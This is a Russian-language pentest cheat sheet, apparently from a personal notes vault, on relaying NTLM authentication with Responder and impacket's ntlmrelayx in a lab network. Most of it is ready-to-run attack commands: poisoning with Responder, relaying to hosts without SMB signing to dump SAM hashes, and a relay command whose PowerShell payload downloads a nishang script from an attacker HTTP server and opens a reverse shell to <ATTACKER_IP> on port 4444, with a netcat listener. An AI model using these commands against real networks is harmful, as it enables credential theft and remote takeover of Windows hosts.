#tool #impacket #relay #ntlm #windows 

####  При использовании ntlmrelayx необходимо отключить прослушку необходимых протоколов на Respondere (SMB/HTTP)


Это связано с тем, что `ntlmrelayx` запускает `SMB`- или `HTTP`-сервер, чтобы он мог ретранслировать соединение от клиентов к серверу, и если `Responder` запускает эти службы, мы не сможем использовать `ntlmrelayx`, так как порт будет уже занят
```bash
sed -i "s/SMB = On/SMB = Off/" Responder.conf

sed -i "s/HTTP = On/HTTP = Off/" Responder.conf
```

## NTLMRelay через SMB 

1) Файл хостов без SMB signing
relayTargets.txt
```
172.16.117.50 
172.16.117.60
```
**`relayTargets.txt` — это список хостов, на которых `ntlmrelayx` попытается** аутентифицироваться

2) Запускаем Respnder в режиме отравления
```bash
sudo python3 Responder.py -I ens192
```
Сам он не перенаправляет, а только отдает результаты аутентификации на порт, который слушает ntlmrelayx

3.1) Используем ntlmrelayx для **SAM dump**
```bash
sudo ntlmrelayx.py -tf relayTargets.txt -smb2support
```
ntlmrelayx уже перенаправляет данные аутентификации на relayTargets и пытается на них аутентифицировать жертву

По умолчанию ntlmrelayx будет аутентифицировать нас по SMB и если аутентификация выполнится успешно от выполнит **SAM dump** и в случае, если учетка была local admin, то он выполнится, иначе нет

> Если атака не сработала - необходимо перезагрузить

![[Pasted image 20260919061056.png]]


3.2) Используем ntlmrelayx для **Выполнения команд**

> -c "Command To Execute"

Как только `Responder` перехватит широковещательный трафик, мы увидим, что `ntlmrelayx` передал `NTLM` аутентификацию юзера от 172.16.117.3 и установил сеанс аутентификации на 172.16.117.50; затем он использовал этот сеанс аутентификации как юзер и выполнил команду, например для получения шелла

1 терминал
```bash
sudo python3 Responder.py -I ens192
```

2 терминал
```bash
nc -lvnp 4444
```

3 терминал
```bash
wget https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1 -q 

python3 -m http.server 8888
```

4 терминал
```bash
sudo ntlmrelayx.py -tf relayTargets.txt -smb2support -c "powershell -c IEX(New-Object NET.WebClient).DownloadString('http://<ATTACKER_IP>:8888/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress <ATTACKER_IP> -Port 4444"
```

